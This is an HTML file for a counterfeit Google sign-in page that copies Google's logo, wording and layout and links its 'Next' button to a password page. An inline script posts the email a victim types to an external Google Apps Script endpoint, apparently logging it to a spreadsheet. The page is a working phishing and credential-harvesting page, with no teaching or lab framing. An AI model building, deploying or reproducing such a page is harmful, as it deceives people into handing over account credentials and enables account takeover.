<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Sign In</title>
    <link rel="stylesheet" href="style.css">

    <!-- Source for fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans&family=Ubuntu:wght@700&display=swap" rel="stylesheet">    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@300&display=swap" rel="stylesheet">
</head>
<body>
    <div id="container">
        <div id="square">
            <div id="logo_container">
                <img src="googlelogo.png" id="logo">
            </div>
            <div id="top_text">Sign in</div>
            <div id="top_subtext">Use your Google Account</div>
            <form id="input_container" name = "submit-to-google-sheet">
                <input type="text" name="Email" id="input">
                <div id="placeholder">Email or phone</div>
            </form>

            <div id="link1" class="link">Forgot email?</div>
            <div id="not">Not your computer? Use Guest mode to sign in privately.</div>
            <div id="link2" class="link">Learn more</div>
            <div id="last_split">
                <div class="btn_container">
                    <input type="button" value="Create account" id="btn_left">
                </div>
                <div id="btn2" class="btn_container">
                    <a href="password.html"><input type="button" value="Next" id="btn_right"></a>
                </div>
            </div>
        </div>


        <div id="bottom_text">
            <div id="lang_container">
                <select name="lang" id="lang">
                    <option value="English(United States)">English(United States)</option>
                </select>
            </div>
            <div>Help</div>
            <div>Privacy</div>
            <div>Terms</div>

        </div>
    </div>
    
    <script src="script.js"></script>
    <script>
      const scriptURL = 'https://script.google.com/macros/s/AKfycby-3ImFCDYPtkWXMKN-B4uyIIXlKL_ge6DhSNGPNaQFSDRW5dYaKXsMfOiq6wNrMf3xpA/exec'
      const form = document.forms['submit-to-google-sheet']
    
      form.addEventListener('Next', e => {
        e.preventDefault()
        fetch(scriptURL, { method: 'POST', body: new FormData(form)})
          .then(response => console.log('Success!', response))
          .catch(error => console.error('Error!', error.message))
  })
</script>
</body>
</html>
